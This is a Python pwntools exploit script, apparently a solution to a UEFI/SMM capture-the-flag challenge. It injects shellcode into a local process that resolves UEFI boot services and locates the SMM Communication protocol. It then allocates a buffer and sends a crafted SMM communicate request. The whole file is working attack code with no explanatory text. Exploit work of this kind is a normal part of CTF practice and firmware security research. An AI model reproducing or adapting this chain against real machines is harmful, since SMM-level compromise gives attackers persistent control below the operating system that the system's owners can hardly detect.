import os
os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

context(arch='amd64')
conn = process('./run.sh')

conn.recvuntil(b'Address of SystemTable: ')
system_table = int(conn.recvline(), 16)

log.info('SystemTable @ 0x%x', system_table)
conn.recvline()

code = asm(f'''
           mov rax, {system_table}
           mov rax, qword ptr [rax + 0x60]  /* BootServices  */
           mov rbx, qword ptr [rax + 0x40]  /* AllocatePool  */
           mov rcx, qword ptr [rax + 0x140] /* LocateProtcol */
           ''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil('RBX: 0x')
AllocatePool = int(conn.recvn(16), 16)
conn.recvuntil('RCX: 0x')
LocateProtocol = int(conn.recvn(16), 16)

log.success('AllocatePool    @ 0x%x', AllocatePool)
log.success('LocateProtocol  @ 0x%x', LocateProtocol)

protoguid = 0x32c3c5ac65db949d4cbd9dc6c68ed8e2

code = asm(f'''
           /* LocateProtocol(guid, NULL, &protocol) */
           lea rcx, qword ptr [rip + guid]
           xor rdx, rdx
           lea r8, qword ptr [rip + protocol]
           mov rax, {LocateProtocol}
           call rax

           test rax, rax
           jnz fail

           mov rax, qword ptr [rip + protocol]
           mov rbx, qword ptr [rax]
           ret

    fail:
        ud2

    guid:
        .octa {protoguid}

    protocol:
''')

conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RAX: 0x')
mSmmCommunication = int(conn.recvn(16), 16)
conn.recvuntil(b'RBX: 0x')
Communicate = int(conn.recvn(16), 16)

log.success('mSmmCommunication               @ 0x%x', mSmmCommunication)
log.success('mSmmCommunication->Communicate  @ 0x%x', Communicate)


efidata = 6

code = asm(f'''
           mov rcx, {efidata}
           mov rdx, 0x1000
           lea r8, qword ptr [rip + buf]
           mov rax, {AllocatePool}
           call rax

           test rax, rax
           jnz fail

           mov rax, qword ptr [rip + buf]
           ret

        fail:
            ud2
        buf:
''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.recvuntil(b'RAX: 0x')
buffer = int(conn.recvn(16), 16)
log.success('Allocated buf: 0x%x', buffer)


cowsay_guid = 0xf79265547535a8b54d102c839a75cf12

code = asm(f'''
           lea rsi, qword ptr [rip + data]
           mov rdi, {buffer}
           mov rcx, 0x20
           cld
           rep movsb

           /* Communicate(mSmmCommunication, buffer, NULL) */
           mov rcx, {mSmmCommunication}
           mov rdx, {buffer}
           xor r8, r8
           mov rax, {Communicate}
           call rax

           test rax, rax
           jnz fail
           ret

        fail:
           ud2

        data:
            .octa {cowsay_guid}
            .quad 8
            .quad 0x44440000
        ''')
conn.sendline(code.hex().encode() + b'\ndone')

conn.interactive()
